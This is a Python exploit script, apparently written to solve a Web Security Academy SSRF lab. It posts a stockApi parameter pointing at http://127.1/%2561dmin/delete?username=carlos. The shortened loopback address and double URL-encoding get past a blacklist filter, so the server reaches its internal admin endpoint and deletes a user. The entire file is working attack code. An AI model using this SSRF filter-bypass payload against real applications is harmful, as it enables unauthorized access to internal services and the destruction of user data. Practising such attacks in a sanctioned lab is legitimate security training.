# === Standard Library ===
import time

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install 'requests' with: pip install requests")

# === User Configuration ===
BASE_URL = "https://0a890086031af8c580505d6d00ff00f0.web-security-academy.net"
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Exploit Function ===
def send_blacklist_bypass():
    exploit_url = "http://127.1/%2561dmin/delete?username=carlos"
    payload = f"stockApi={exploit_url}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print(f"[*] Sending exploit payload to: {exploit_url}")
    res = requests.post(
        f"{BASE_URL}/product/stock",
        headers=headers,
        data=payload,
        proxies=PROXY if USE_PROXY else None
    )

    if res.status_code == 200:
        print("[+] Request sent successfully.")
        print("[*] Check the lab UI for completion.")
    else:
        print(f"[-] Exploit failed. Status code: {res.status_code}")

# === Main ===
if __name__ == "__main__":
    print("[*] Starting SSRF blacklist bypass attack...")
    send_blacklist_bypass()
